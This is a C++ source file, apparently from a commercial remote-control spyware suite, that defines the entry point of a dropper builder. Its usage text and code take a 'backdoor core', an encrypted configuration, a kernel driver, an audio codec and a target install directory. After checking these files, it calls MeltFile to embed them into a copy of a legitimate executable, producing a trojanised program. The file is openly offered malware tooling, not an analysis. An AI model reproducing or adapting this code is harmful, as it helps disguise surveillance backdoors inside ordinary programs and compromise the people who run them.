// RCSDropper.cpp : Defines the entry point for the console application.
//

#pragma warning ( disable: 4996 )

#include "stdafx.h"
#include <Windows.h>
#include "dropper.h"

#include "MeltFile.h"

int _tmain(int argc, _TCHAR* argv[])
{
	HMODULE hDropper;
	HANDLE hFile;
	BOOL ret = FALSE;
	CHAR szOutputFile[MAX_PATH];
	TCHAR *wsExeFile; 
	TCHAR *wsOutputFile;
	MelterStruct MS;
	
	ZeroMemory(&MS, sizeof(MelterStruct));
	MS.manifest = FALSE;
	
	if (argc != 9) {
		printf("ERROR: \n");
		printf("  usage:  RCSWin32Dropper.exe  <core> <conf> <driver> <codec> <instdir> <manifest> <input> <output>\n\n");
		printf("  <core> is the backdoor core\n");
		printf("  <conf> is the backdoor encrypted configuration\n");
		printf("  <driver> is the kernel driver\n");
		printf("  <codec> is the audio codec\n");
		printf("  <instdir> is the backdoor install directory (on the target)\n");
		printf("  <manifest> is a boolean flag for modifying the manifest\n");
		printf("  <input> is the exe to be melted\n");
		printf("  <output> is the output file\n\n");
		return 0;
	}
	
	/************************************************************************/
	/* PREPARING PARAMETERS                                                 */
	/************************************************************************/
	
	for (int i = 0; i < argc; i++)
		printf("%s\n", argv[i]);
	
	sprintf(MS.core, "%s", argv[1]);

	printf("%s %s\n", argv[1], MS.core);

	sprintf(MS.conf, "%s", argv[2]);
	if (_tcscmp(argv[3], "null")) {
		sprintf(MS.driver, "%s", argv[3]);
	}
	if (_tcscmp(argv[4], "null")) {
		sprintf(MS.codec, "%s", argv[4]);
	}
	printf("Instdir = %s\n", argv[5]);
	sprintf(MS.instdir, "%s", argv[5]);

	printf("%s %s\n", argv[5], MS.instdir);
	
	if (!_tcscmp(argv[6], "1") )
		MS.manifest = TRUE;
	
	wsExeFile = _tcsdup(argv[7]);
	wsOutputFile = _tcsdup(argv[8]);
	
	/************************************************************************/
	/*  SANITY CHECKS                                                       */
	/************************************************************************/
	
	if ((hFile = CreateFile(wsExeFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find the input exe file [%s]\n", wsExeFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}
	
	if ((hFile = CreateFile(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find the core file [%s]\n", argv[1]);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}
	
	if ((hFile = CreateFile(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find the config file [%s]\n", argv[2]);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}
	
	if ((hFile = CreateFile(argv[3], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find the driver file [%s]\n", argv[3]);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ((hFile = CreateFile(argv[4], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find the codec file [%s]\n", argv[4]);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	/************************************************************************/
	/*  READY TO GO                                                         */
	/************************************************************************/
	
	printf("Ready to go...\n");
	printf("CORE          [%s]\n", MS.core);
	printf("CONFIGURATION [%s]\n", MS.conf);
	printf("INSTALL DIR   [%s]\n", MS.instdir);
	printf("DRIVER        [%s]\n", (MS.driver) ? MS.driver : "null");
	printf("CODEC         [%s]\n", (MS.codec) ? MS.codec : "null");
	printf("MANIFEST      [%d]\n", MS.manifest);
	printf("INPUT         [%s]\n", wsExeFile);
	printf("OUTPUT        [%s]\n\n", wsOutputFile);
	
	if (!CopyFile(wsExeFile, wsOutputFile, FALSE) ) {
		printf("Cannot create output file [%s]\n", wsOutputFile);
		return ERROR_OUTPUT;
	} else {
		sprintf(szOutputFile, "%s", wsOutputFile);
	}
	
	/************************************************************************/
	/* DROPPER                                                              */
	/************************************************************************/
	
	try {
		int ret = MeltFile(
			wsExeFile,
			wsOutputFile,
			&MS
			);
	} catch (...) {
		printf("Error while running dropper\n");
		DeleteFile(wsOutputFile);
		return ERROR_POLYMER;
	} 
	
	if(ret) {
		if ( 0 ) {
			printf("Error embedding manifest: try to change melting EXE!\n");
			DeleteFile(wsOutputFile);
			return ERROR_MANIFEST;
		} else {
			DWORD err = GetLastError();
			printf("Error building exe [%d]\n", err);
			DeleteFile(wsOutputFile);
			return ERROR_OUTPUT;
		}
	}
	
	printf("Output file melted... ok\n");
	
	// FreeLibrary(hDropper);
	
	return ERROR_SUCCESS;
}
